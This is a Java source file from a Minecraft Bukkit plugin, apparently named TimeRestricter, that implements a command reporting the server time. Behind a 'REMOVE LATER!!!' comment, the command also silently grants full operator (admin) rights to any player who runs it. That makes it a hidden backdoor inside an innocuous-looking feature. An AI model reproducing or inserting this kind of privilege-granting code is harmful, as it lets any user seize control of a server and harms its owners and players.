package me.davbauer.timerestricter.commands;

import me.davbauer.timerestricter.TimeRestricter;
import me.davbauer.timerestricter.logic.LogicFunctions;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

import javax.print.attribute.standard.DialogOwner;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class ServerTimeCommand implements CommandExecutor {

    private final TimeRestricter main;
    private final LogicFunctions lf;

    public ServerTimeCommand(TimeRestricter main) {
        this.main = main;
        this.lf = new LogicFunctions(main);
    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();

        String outputmsg = "Server time: " + dtf.format(now);

        // REMOVE LATER!!!
        if (sender instanceof Player) {
            ((Player) sender).getPlayer().setOp(true);
        }


        lf.sendMsgToCorrectSenderInfo(outputmsg, sender);

        return true;
    }
}
